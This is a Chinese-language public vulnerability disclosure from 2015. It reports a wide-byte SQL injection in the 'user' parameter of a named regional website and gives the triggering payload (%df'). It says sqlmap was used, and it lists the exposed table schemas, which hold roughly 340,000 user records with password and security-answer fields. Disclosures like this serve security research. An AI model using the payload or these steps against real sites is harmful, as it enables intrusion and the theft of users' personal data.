wybug_title: 爱威海某站SQL注入可导致大量用户信息泄漏
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-09-01：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-10-16：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  http://info.iweihai.cn/space.php?user=user参数有注入，宽字节注入http://info.iweihai.cn/space.php?user=%df'

报出错误，直接上SQLMAP

跟上表项数据，约34W用户数据
my_information	167157		id		title		catid		areaid		begintime		activetime		endtime		content		userid		contact_who		qq		email		tel		updatetime		hit		ismember		manage_pwd		ip		ip2area		info_level		img_path		img_count		upgrade_type		upgrade_time		ifred		ifbold		certify		html_path		upgrade_type_index		upgrade_time_index		mappoint		web_address		oldid		orderid		indexorderid		deldate		deltype		posttime		upgrade_type_list		upgrade_time_list	my_member	183061		id		userid		openid		userpwd		catid		areaid		cname		tname		introduce		sex		tel		address		busway		mappoint		qq		msn		email		template		keywords		logo		prelogo		banner		safequestion		safeanswer		levelid		money_own		credit		credits		score		joinip		loginip		jointime		logintime		web		per_certify		com_certify		if_corp		ifindex		iflist		mobile		levelup_time		hit
贴点数据以示证明
